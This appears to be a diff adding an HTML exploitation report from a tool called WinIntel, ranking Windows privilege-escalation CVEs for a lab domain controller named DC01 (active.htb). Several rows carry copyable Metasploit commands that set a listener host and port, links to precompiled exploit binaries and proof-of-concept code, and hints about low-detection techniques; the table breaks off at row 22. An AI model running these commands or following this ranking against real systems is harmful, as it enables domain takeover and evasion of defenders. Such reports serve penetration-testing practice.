@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WinIntel Report — DC01</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d1117;color:#e6edf3;font-family:'Segoe UI',system-ui,sans-serif;font-size:14px;line-height:1.5;padding:32px;max-width:1100px;margin:0 auto}
+.head{border-bottom:2px solid #00d4a8;padding-bottom:20px;margin-bottom:24px}
+.logo{font-family:'Cascadia Code','JetBrains Mono',monospace;font-size:11px;color:#00d4a8;white-space:pre;line-height:1.2;margin-bottom:12px}
+h1{font-size:22px;color:#fff;margin-bottom:4px}
+.sub{color:#8b949e;font-size:13px}
+.meta{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px;margin:24px 0;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:18px}
+.meta div span{display:block;color:#6e7681;font-size:11px;text-transform:uppercase;letter-spacing:.05em}
+.meta div b{color:#e6edf3;font-size:15px;font-weight:600}
+.stats{display:flex;gap:12px;margin-bottom:24px;flex-wrap:wrap}
+.stat{flex:1;min-width:120px;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:14px 16px;text-align:center}
+.stat .n{font-size:28px;font-weight:700;line-height:1}
+.stat .l{font-size:11px;color:#6e7681;text-transform:uppercase;margin-top:4px}
+.n.green{color:#00d4a8}.n.yellow{color:#d29922}.n.red{color:#f85149}.n.blue{color:#58a6ff}
+table{width:100%;border-collapse:collapse;background:#161b22;border:1px solid #30363d;border-radius:8px;overflow:hidden}
+th{background:#1c2128;color:#8b949e;text-align:left;padding:12px;font-size:11px;text-transform:uppercase;letter-spacing:.05em;border-bottom:1px solid #30363d}
+td{padding:14px 12px;border-bottom:1px solid #21262d;vertical-align:top}
+tr:last-child td{border-bottom:none}
+.rank{font-weight:700;color:#6e7681;font-size:16px}
+.bar{position:relative;width:90px;height:22px;background:#0d1117;border-radius:4px;overflow:hidden}
+.bar .fill{height:100%;border-radius:4px}
+.bar span{position:absolute;top:0;left:0;right:0;text-align:center;line-height:22px;font-size:12px;font-weight:700;color:#0d1117}
+.verdict{font-weight:700;font-size:13px;white-space:nowrap}
+.cve a{color:#58a6ff;text-decoration:none;font-weight:600;font-family:monospace}
+.cve a:hover{text-decoration:underline}
+.desc{color:#c9d1d9;font-size:13px;margin-top:6px}
+.notes{color:#8b949e;font-size:12px;margin-top:4px;font-style:italic}
+.edrhint{color:#d29922;font-size:12px;margin-top:4px}
+.exploit{margin-top:8px}
+.method{display:flex;align-items:center;gap:8px;margin:5px 0;flex-wrap:wrap}
+.mtag{display:inline-block;font-size:9px;font-weight:700;padding:2px 7px;border-radius:3px;letter-spacing:.04em;min-width:48px;text-align:center}
+.msf-tag{background:#0d2818;color:#3fb950;border:1px solid #1a4b2c}
+.bin-tag{background:#2a1a3e;color:#bc8cff;border:1px solid #4a2e6e}
+.edb-tag{background:#2d2410;color:#d29922;border:1px solid #4a3a10}
+.poc-tag{background:#0d1f3a;color:#58a6ff;border:1px solid #1a3a6a}
+.nomethod{color:#6e7681;font-size:12px;font-style:italic}
+code.msf{display:inline-block;background:#0d2818;color:#3fb950;padding:6px 10px;border-radius:4px;font-family:monospace;font-size:12px;border:1px solid #1a4b2c}
+.link{color:#bc8cff;font-size:12px;font-family:monospace;text-decoration:none}
+.link:hover{text-decoration:underline}
+.rel{font-size:12px;color:#8b949e;white-space:nowrap}
+.kb{font-family:monospace;font-size:12px;color:#6e7681}
+.badge{display:inline-block;font-size:9px;font-weight:700;padding:2px 6px;border-radius:3px;margin-left:6px;vertical-align:middle;letter-spacing:.03em}
+.badge.confirmed{background:#0d2818;color:#3fb950;border:1px solid #1a4b2c}
+.badge.likely{background:#2d2410;color:#d29922;border:1px solid #4a3a10}
+.badge.itw{background:#2d0d0d;color:#f85149;border:1px solid #5a1a1a}
+.badge.kev{background:#1a0d2e;color:#bc8cff;border:1px solid #3d1f6e}
+.badge.loud{background:#2d0d0d;color:#ff7b72;border:1px solid #5a1a1a}
+.badge.quiet{background:#0d1f3a;color:#58a6ff;border:1px solid #1a3a6a}
+.foot{margin-top:28px;padding-top:16px;border-top:1px solid #30363d;color:#6e7681;font-size:12px;text-align:center}
+.foot a{color:#00d4a8;text-decoration:none}
+.section{font-size:16px;color:#fff;margin:28px 0 14px;padding-bottom:8px;border-bottom:1px solid #30363d;font-weight:600}
+.section-sub{font-size:12px;color:#6e7681;font-weight:400;text-transform:none;letter-spacing:0}
+.chains{display:flex;flex-direction:column;gap:10px}
+.chain{background:#161b22;border:1px solid #30363d;border-left:3px solid #bc8cff;border-radius:8px;padding:14px 16px}
+.chain-name{color:#bc8cff;font-weight:700;font-size:14px;margin-bottom:6px}
+.chain-note{color:#c9d1d9;font-size:13px;margin-bottom:6px}
+.chain-cves{color:#6e7681;font-size:12px;font-family:monospace}
+.msfwrap{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.copy{background:#21262d;color:#8b949e;border:1px solid #30363d;border-radius:4px;padding:4px 10px;font-size:11px;cursor:pointer;font-family:inherit;transition:all .15s}
+.copy:hover{background:#30363d;color:#e6edf3;border-color:#00d4a8}
+.copy.done{background:#0d2818;color:#3fb950;border-color:#1a4b2c}
+.toolbar{display:flex;gap:10px;margin-bottom:20px}
+.btn{background:#21262d;color:#c9d1d9;border:1px solid #30363d;border-radius:6px;padding:8px 14px;font-size:12px;cursor:pointer;font-family:inherit;text-decoration:none;display:inline-flex;align-items:center;gap:6px;transition:all .15s}
+.btn:hover{background:#30363d;border-color:#00d4a8;color:#fff}
+@media print{
+  body{background:#fff;color:#111;padding:12px;max-width:100%}
+  .toolbar,.copy{display:none}
+  .meta,.stat,table,.chain{background:#fafafa;border-color:#ddd}
+  th{background:#f0f0f0;color:#333}
+  .cve a,.foot a{color:#0066cc}
+  .desc,.chain-note{color:#222}
+  code.msf{background:#eef7ee;color:#0a5}
+  .logo{color:#0a8}
+  h1,.section{color:#000}
+  .n.green{color:#0a8}.n.yellow{color:#b80}.n.red{color:#c00}.n.blue{color:#06c}
+  .stats{break-inside:avoid}
+}
+</style></head><body>
+<div class="head">
+<div class="logo"> ██╗    ██╗██╗███╗   ██╗██╗███╗   ██╗████████╗███████╗██╗
+ ██║ █╗ ██║██║██╔██╗ ██║██║██╔██╗ ██║   ██║   █████╗  ██║
+ ╚███╔███╔╝██║██║ ╚████║██║██║ ╚████║   ██║   ███████╗███████╗</div>
+<h1>Windows Exploitation Report</h1>
+<div class="sub">Generated by WinIntel v1.0.0 · 2026-06-12 14:41</div>
+</div>
+
+<div class="toolbar">
+<button class="btn" onclick="window.print()">&#128424; Print / Save as PDF</button>
+<a class="btn" href="https://github.com/drgoteee/winintel" target="_blank">&#11088; WinIntel on GitHub</a>
+</div>
+
+<div class="meta">
+<div><span>Host</span><b>DC01</b></div>
+<div><span>Operating System</span><b>Microsoft Windows Server 2012 R2 Datacen</b></div>
+<div><span>Build / Arch</span><b>9600 · X64</b></div>
+<div><span>Hotfixes</span><b>0 installed</b></div>
+<div><span>Domain</span><b>active.htb</b></div>
+<div><span>Services</span><b>kerberos, local</b></div>
+</div>
+
+<div class="stats">
+<div class="stat"><div class="n green">15</div><div class="l">Confirmed</div></div>
+<div class="stat"><div class="n yellow">9</div><div class="l">Likely</div></div>
+<div class="stat"><div class="n red">10</div><div class="l">In The Wild</div></div>
+<div class="stat"><div class="n blue">9</div><div class="l">CISA KEV</div></div>
+<div class="stat"><div class="n">24</div><div class="l">Ranked</div></div>
+</div>
+
+<table>
+<thead><tr><th>Rank</th><th>Score</th><th>Verdict</th><th>Vulnerability</th><th>Reliability</th><th>Patch</th></tr></thead>
+<tbody>
+        <tr>
+          <td class="rank">#1</td>
+          <td><div class="bar"><div class="fill" style="width:98%;background:#00d4a8"></div><span>98</span></div></td>
+          <td><span class="verdict" style="color:#00d4a8">TRY FIRST</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6324" target="_blank">CVE-2014-6324</a>
+            <span class="badge confirmed">CONFIRMED</span><span class="badge itw">ITW</span><span class="badge kev">CISA KEV</span>
+            <div class="desc">Kerberos PAC validation bypass — domain privilege escalation to DA</div>
+            <div class="notes">MS14-068 Kerberos PAC bypass — domain admin in one shot if domain joined. Requires low-priv domain account.</div>
+            <div class="exploit"><div class="method"><span class="mtag msf-tag">MSF</span><div class="msfwrap"><code class="msf">use exploit/windows/kerberos/ms14_068_kerberos_checksum</code><button class="copy" onclick="cp(this,'use exploit/windows/kerberos/ms14_068_kerberos_checksum; set SESSION 1; set LHOST tun0; set LPORT 4444; run')">copy</button></div></div><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068" target="_blank" class="link">Precompiled: SecWiki/MS14-068 &#8599;</a></div><div class="method"><span class="mtag poc-tag">PoC</span><a href="https://github.com/gentilkiwi/kekeo" target="_blank" class="link">github.com/gentilkiwi/kekeo &#8599;</a></div></div>
+          </td>
+          <td class="rel">Excellent</td>
+          <td class="kb">KB3011780</td>
+        </tr>
+        <tr>
+          <td class="rank">#2</td>
+          <td><div class="bar"><div class="fill" style="width:88%;background:#00d4a8"></div><span>88</span></div></td>
+          <td><span class="verdict" style="color:#00d4a8">TRY FIRST</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-4113" target="_blank">CVE-2014-4113</a>
+            <span class="badge confirmed">CONFIRMED</span><span class="badge itw">ITW</span>
+            <div class="desc">Win32k.sys use-after-free (track popup menu) — local SYSTEM, exploited ITW</div>
+            <div class="notes">Win32k UAF — exploited ITW by APT groups. Reliable MSF module.</div>
+            <div class="exploit"><div class="method"><span class="mtag msf-tag">MSF</span><div class="msfwrap"><code class="msf">use exploit/windows/local/ms14_058_track_popup_menu</code><button class="copy" onclick="cp(this,'use exploit/windows/local/ms14_058_track_popup_menu; set SESSION 1; set LHOST tun0; set LPORT 4444; run')">copy</button></div></div><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-058" target="_blank" class="link">Precompiled: SecWiki/MS14-058 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Great</td>
+          <td class="kb">KB3000061</td>
+        </tr>
+        <tr>
+          <td class="rank">#3</td>
+          <td><div class="bar"><div class="fill" style="width:86%;background:#00d4a8"></div><span>86</span></div></td>
+          <td><span class="verdict" style="color:#00d4a8">TRY FIRST</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-2546" target="_blank">CVE-2015-2546</a>
+            <span class="badge confirmed">CONFIRMED</span><span class="badge itw">ITW</span><span class="badge kev">CISA KEV</span>
+            <div class="desc">Win32k.sys memory corruption — local SYSTEM, exploited ITW</div>
+            <div class="notes">Win32k — exploited ITW by APT, affects Win8.1+</div>
+            <div class="exploit"><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-097" target="_blank" class="link">Precompiled: SecWiki/MS15-097 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Great</td>
+          <td class="kb">KB3089656</td>
+        </tr>
+        <tr>
+          <td class="rank">#4</td>
+          <td><div class="bar"><div class="fill" style="width:84%;background:#00d4a8"></div><span>84</span></div></td>
+          <td><span class="verdict" style="color:#00d4a8">TRY FIRST</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2016-0099" target="_blank">CVE-2016-0099</a>
+            <span class="badge confirmed">CONFIRMED</span><span class="badge quiet">QUIET</span>
+            <div class="desc">Secondary Logon service handle LPE — local SYSTEM (PowerShell PoC public)</div>
+            <div class="notes">MS16-032 Secondary Logon — PowerShell PoC public + MSF module. First try on Win7/8/10.</div><div class="edrhint">Quiet technique (token/file-based) — low IOC footprint.</div>
+            <div class="exploit"><div class="method"><span class="mtag msf-tag">MSF</span><div class="msfwrap"><code class="msf">use exploit/windows/local/ms16_032_secondary_logon_handle_privesc</code><button class="copy" onclick="cp(this,'use exploit/windows/local/ms16_032_secondary_logon_handle_privesc; set SESSION 1; set LHOST tun0; set LPORT 4444; run')">copy</button></div></div><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032" target="_blank" class="link">Precompiled: SecWiki/MS16-032 &#8599;</a></div><div class="method"><span class="mtag poc-tag">PoC</span><a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1" target="_blank" class="link">raw.githubusercontent.com/EmpireProject/Empire/ma... &#8599;</a></div></div>
+          </td>
+          <td class="rel">Excellent</td>
+          <td class="kb">KB3143141</td>
+        </tr>
+        <tr>
+          <td class="rank">#5</td>
+          <td><div class="bar"><div class="fill" style="width:80%;background:#00d4a8"></div><span>80</span></div></td>
+          <td><span class="verdict" style="color:#00d4a8">TRY FIRST</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2016-3225" target="_blank">CVE-2016-3225</a>
+            <span class="badge confirmed">CONFIRMED</span><span class="badge quiet">QUIET</span>
+            <div class="desc">Hot Potato / RottenPotato NTLM relay — local SYSTEM</div>
+            <div class="notes">Hot Potato / RottenPotato NTLM relay — local SYSTEM via NBNS spoof + NTLM relay</div><div class="edrhint">Quiet technique (token/file-based) — low IOC footprint.</div>
+            <div class="exploit"><div class="method"><span class="mtag msf-tag">MSF</span><div class="msfwrap"><code class="msf">use exploit/windows/local/ms16_075_reflection_juicy</code><button class="copy" onclick="cp(this,'use exploit/windows/local/ms16_075_reflection_juicy; set SESSION 1; set LHOST tun0; set LPORT 4444; run')">copy</button></div></div><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075" target="_blank" class="link">Precompiled: SecWiki/MS16-075 &#8599;</a></div><div class="method"><span class="mtag poc-tag">PoC</span><a href="https://github.com/foxglovesec/RottenPotato" target="_blank" class="link">github.com/foxglovesec/RottenPotato &#8599;</a></div></div>
+          </td>
+          <td class="rel">Great</td>
+          <td class="kb">KB3164038</td>
+        </tr>
+        <tr>
+          <td class="rank">#6</td>
+          <td><div class="bar"><div class="fill" style="width:78%;background:#3fb950"></div><span>78</span></div></td>
+          <td><span class="verdict" style="color:#3fb950">STRONG</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2016-3309" target="_blank">CVE-2016-3309</a>
+            <span class="badge confirmed">CONFIRMED</span><span class="badge kev">CISA KEV</span>
+            <div class="desc">Win32k.sys kernel driver LPE — local SYSTEM (Win 8.1 x64)</div>
+            <div class="notes">MS16-098 Win32k LPE — x64 binary on SecWiki works well on 8.1/2012R2</div>
+            <div class="exploit"><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098" target="_blank" class="link">Precompiled: SecWiki/MS16-098 &#8599;</a></div><div class="method"><span class="mtag edb-tag">EDB</span><a href="https://www.exploit-db.com/exploits/41020" target="_blank" class="link">https://www.exploit-db.com/exploits/41020 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Great</td>
+          <td class="kb">KB3178466</td>
+        </tr>
+        <tr>
+          <td class="rank">#7</td>
+          <td><div class="bar"><div class="fill" style="width:75%;background:#3fb950"></div><span>75</span></div></td>
+          <td><span class="verdict" style="color:#3fb950">STRONG</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2016-7255" target="_blank">CVE-2016-7255</a>
+            <span class="badge confirmed">CONFIRMED</span><span class="badge itw">ITW</span>
+            <div class="desc">Win32k.sys use-after-free — local SYSTEM (exploited ITW by APT28)</div>
+            <div class="notes">Win32k UAF — exploited ITW by APT28 (Fancy Bear), SecWiki binary available</div>
+            <div class="exploit"><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135" target="_blank" class="link">Precompiled: SecWiki/MS16-135 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Good</td>
+          <td class="kb">KB3199135</td>
+        </tr>
+        <tr>
+          <td class="rank">#8</td>
+          <td><div class="bar"><div class="fill" style="width:73%;background:#3fb950"></div><span>73</span></div></td>
+          <td><span class="verdict" style="color:#3fb950">STRONG</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-37969" target="_blank">CVE-2022-37969</a>
+            <span class="badge confirmed">CONFIRMED</span><span class="badge kev">CISA KEV</span>
+            <div class="desc">CLFS driver LPE — local SYSTEM, exploited ITW by Nokoyawa and other ransomware groups</div>
+            
+            <div class="exploit"><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2022-37969" target="_blank" class="link">Precompiled: SecWiki/CVE-2022-37969 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Good</td>
+          <td class="kb">KB5017316</td>
+        </tr>
+        <tr>
+          <td class="rank">#9</td>
+          <td><div class="bar"><div class="fill" style="width:68%;background:#3fb950"></div><span>68</span></div></td>
+          <td><span class="verdict" style="color:#3fb950">STRONG</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-0859" target="_blank">CVE-2019-0859</a>
+            <span class="badge likely">LIKELY</span><span class="badge itw">ITW</span><span class="badge kev">CISA KEV</span>
+            <div class="desc">Win32k use-after-free EoP — local SYSTEM, exploited ITW by SandCat/APT (Apr 2019)</div>
+            <div class="notes">Win32k UAF — ITW by SandCat APT. Reliable on Win7 SP1 through early Win10. SecWiki binary available.</div>
+            <div class="exploit"><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2019-0859" target="_blank" class="link">Precompiled: SecWiki/CVE-2019-0859 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Great</td>
+          <td class="kb">—</td>
+        </tr>
+        <tr>
+          <td class="rank">#10</td>
+          <td><div class="bar"><div class="fill" style="width:68%;background:#3fb950"></div><span>68</span></div></td>
+          <td><span class="verdict" style="color:#3fb950">STRONG</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-1458" target="_blank">CVE-2019-1458</a>
+            <span class="badge likely">LIKELY</span><span class="badge itw">ITW</span><span class="badge kev">CISA KEV</span>
+            <div class="desc">Win32k EoP — local SYSTEM (Win7/8/10, exploited ITW before Jan 2020)</div>
+            <div class="notes">Win32k LPE — exploited ITW by WizardOpium APT. SecWiki binary available.</div>
+            <div class="exploit"><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2019-1458" target="_blank" class="link">Precompiled: SecWiki/CVE-2019-1458 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Great</td>
+          <td class="kb">—</td>
+        </tr>
+        <tr>
+          <td class="rank">#11</td>
+          <td><div class="bar"><div class="fill" style="width:67%;background:#3fb950"></div><span>67</span></div></td>
+          <td><span class="verdict" style="color:#3fb950">STRONG</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-0003" target="_blank">CVE-2015-0003</a>
+            <span class="badge confirmed">CONFIRMED</span>
+            <div class="desc">Application compatibility cache LPE — local SYSTEM</div>
+            <div class="notes">AppCompat cache — rarely has prebuilt binary, may need to compile</div>
+            <div class="exploit"><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-001" target="_blank" class="link">Precompiled: SecWiki/MS15-001 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Good</td>
+          <td class="kb">KB3023266</td>
+        </tr>
+        <tr>
+          <td class="rank">#12</td>
+          <td><div class="bar"><div class="fill" style="width:67%;background:#3fb950"></div><span>67</span></div></td>
+          <td><span class="verdict" style="color:#3fb950">STRONG</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-0057" target="_blank">CVE-2015-0057</a>
+            <span class="badge confirmed">CONFIRMED</span>
+            <div class="desc">Win32k.sys scrollbar use-after-free — local SYSTEM</div>
+            <div class="notes">Win32k scrollbar UAF — check SecWiki for prebuilt binary</div>
+            <div class="exploit"><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-010" target="_blank" class="link">Precompiled: SecWiki/MS15-010 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Good</td>
+          <td class="kb">KB3036220</td>
+        </tr>
+        <tr>
+          <td class="rank">#13</td>
+          <td><div class="bar"><div class="fill" style="width:67%;background:#3fb950"></div><span>67</span></div></td>
+          <td><span class="verdict" style="color:#3fb950">STRONG</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-0062" target="_blank">CVE-2015-0062</a>
+            <span class="badge confirmed">CONFIRMED</span>
+            <div class="desc">CreateProcess impersonation token LPE — local SYSTEM</div>
+            
+            <div class="exploit"><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-015" target="_blank" class="link">Precompiled: SecWiki/MS15-015 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Good</td>
+          <td class="kb">KB3031432</td>
+        </tr>
+        <tr>
+          <td class="rank">#14</td>
+          <td><div class="bar"><div class="fill" style="width:67%;background:#3fb950"></div><span>67</span></div></td>
+          <td><span class="verdict" style="color:#3fb950">STRONG</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-2387" target="_blank">CVE-2015-2387</a>
+            <span class="badge confirmed">CONFIRMED</span>
+            <div class="desc">Win32k.sys font parsing — local SYSTEM</div>
+            
+            <div class="exploit"><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-061" target="_blank" class="link">Precompiled: SecWiki/MS15-061 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Good</td>
+          <td class="kb">KB3057839</td>
+        </tr>
+        <tr>
+          <td class="rank">#15</td>
+          <td><div class="bar"><div class="fill" style="width:67%;background:#3fb950"></div><span>67</span></div></td>
+          <td><span class="verdict" style="color:#3fb950">STRONG</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-2426" target="_blank">CVE-2015-2426</a>
+            <span class="badge confirmed">CONFIRMED</span>
+            <div class="desc">Adobe Type Manager (ATM) font driver LPE — local SYSTEM</div>
+            
+            <div class="exploit"><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-077" target="_blank" class="link">Precompiled: SecWiki/MS15-077 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Good</td>
+          <td class="kb">KB3077657</td>
+        </tr>
+        <tr>
+          <td class="rank">#16</td>
+          <td><div class="bar"><div class="fill" style="width:67%;background:#3fb950"></div><span>67</span></div></td>
+          <td><span class="verdict" style="color:#3fb950">STRONG</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-2370" target="_blank">CVE-2015-2370</a>
+            <span class="badge confirmed">CONFIRMED</span>
+            <div class="desc">RPC elevation of privilege via impersonation — local SYSTEM</div>
+            
+            <div class="exploit"><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-076" target="_blank" class="link">Precompiled: SecWiki/MS15-076 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Good</td>
+          <td class="kb">KB3067505</td>
+        </tr>
+        <tr>
+          <td class="rank">#17</td>
+          <td><div class="bar"><div class="fill" style="width:67%;background:#3fb950"></div><span>67</span></div></td>
+          <td><span class="verdict" style="color:#3fb950">STRONG</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2016-0167" target="_blank">CVE-2016-0167</a>
+            <span class="badge confirmed">CONFIRMED</span>
+            <div class="desc">Win32k.sys use-after-free — local SYSTEM</div>
+            <div class="notes">Win32k UAF — SecWiki binary available, works on Win Vista–10</div>
+            <div class="exploit"><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034" target="_blank" class="link">Precompiled: SecWiki/MS16-034 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Good</td>
+          <td class="kb">KB3143145</td>
+        </tr>
+        <tr>
+          <td class="rank">#18</td>
+          <td><div class="bar"><div class="fill" style="width:63%;background:#3fb950"></div><span>63</span></div></td>
+          <td><span class="verdict" style="color:#3fb950">STRONG</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-40449" target="_blank">CVE-2021-40449</a>
+            <span class="badge likely">LIKELY</span><span class="badge itw">ITW</span><span class="badge kev">CISA KEV</span>
+            <div class="desc">Win32k use-after-free EoP (CallNextHookEx) — local SYSTEM, exploited ITW by MysterySnail/IronHusky APT (Oct 2021)</div>
+            <div class="notes">Win32k UAF — ITW by MysterySnail/IronHusky APT (Kaspersky). Works Win7 through Win10 21H1. SecWiki binary available.</div>
+            <div class="exploit"><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2021-40449" target="_blank" class="link">Precompiled: SecWiki/CVE-2021-40449 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Good</td>
+          <td class="kb">—</td>
+        </tr>
+        <tr>
+          <td class="rank">#19</td>
+          <td><div class="bar"><div class="fill" style="width:63%;background:#3fb950"></div><span>63</span></div></td>
+          <td><span class="verdict" style="color:#3fb950">STRONG</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-8453" target="_blank">CVE-2018-8453</a>
+            <span class="badge likely">LIKELY</span><span class="badge itw">ITW</span><span class="badge kev">CISA KEV</span>
+            <div class="desc">Win32k use-after-free EoP — local SYSTEM (Win8.1+, exploited ITW)</div>
+            <div class="notes">Win32k UAF — exploited ITW by FruityArmor APT. Win8.1+ targets.</div>
+            <div class="exploit"><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8453" target="_blank" class="link">Precompiled: SecWiki/CVE-2018-8453 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Good</td>
+          <td class="kb">—</td>
+        </tr>
+        <tr>
+          <td class="rank">#20</td>
+          <td><div class="bar"><div class="fill" style="width:62%;background:#3fb950"></div><span>62</span></div></td>
+          <td><span class="verdict" style="color:#3fb950">STRONG</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-8440" target="_blank">CVE-2018-8440</a>
+            <span class="badge likely">LIKELY</span><span class="badge itw">ITW</span><span class="badge quiet">QUIET</span>
+            <div class="desc">Windows ALPC LPE — local SYSTEM (all Windows before Sep 2018 patch)</div>
+            <div class="notes">ALPC LPE — all Windows before Sep 2018. Public PoC reliable.</div><div class="edrhint">Quiet technique (token/file-based) — low IOC footprint.</div>
+            <div class="exploit"><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8440" target="_blank" class="link">Precompiled: SecWiki/CVE-2018-8440 &#8599;</a></div><div class="method"><span class="mtag edb-tag">EDB</span><a href="https://www.exploit-db.com/exploits/45053" target="_blank" class="link">https://www.exploit-db.com/exploits/45053 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Great</td>
+          <td class="kb">—</td>
+        </tr>
+        <tr>
+          <td class="rank">#21</td>
+          <td><div class="bar"><div class="fill" style="width:54%;background:#d29922"></div><span>54</span></div></td>
+          <td><span class="verdict" style="color:#d29922">VIABLE</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-0213" target="_blank">CVE-2017-0213</a>
+            <span class="badge likely">LIKELY</span><span class="badge quiet">QUIET</span>
+            <div class="desc">Windows COM aggregate marshaler LPE — local SYSTEM</div>
+            <div class="notes">COM marshaler LPE — widely used in CTFs. SecWiki binary works without recompile.</div><div class="edrhint">Quiet technique (token/file-based) — low IOC footprint.</div>
+            <div class="exploit"><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213" target="_blank" class="link">Precompiled: SecWiki/CVE-2017-0213 &#8599;</a></div><div class="method"><span class="mtag edb-tag">EDB</span><a href="https://www.exploit-db.com/exploits/42020" target="_blank" class="link">https://www.exploit-db.com/exploits/42020 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Great</td>
+          <td class="kb">—</td>
+        </tr>
+        <tr>
+          <td class="rank">#22</td>
+          <td><div class="bar"><div class="fill" style="width:49%;background:#d29922"></div><span>49</span></div></td>
+          <td><span class="verdict" style="color:#d29922">VIABLE</span></td>
+          <td class="cve">
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-8639" target="_blank">CVE-2018-8639</a>
+            <span class="badge likely">LIKELY</span>
+            <div class="desc">Win32k use-after-free — local SYSTEM (Win7/8/10, before Dec 2018 patch)</div>
+            <div class="notes">Win32k UAF — pre-Dec 2018 Windows. SecWiki binary available.</div>
+            <div class="exploit"><div class="method"><span class="mtag bin-tag">BINARY</span><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8639" target="_blank" class="link">Precompiled: SecWiki/CVE-2018-8639 &#8599;</a></div></div>
+          </td>
+          <td class="rel">Good</td>
+          <td class="kb">—</td>
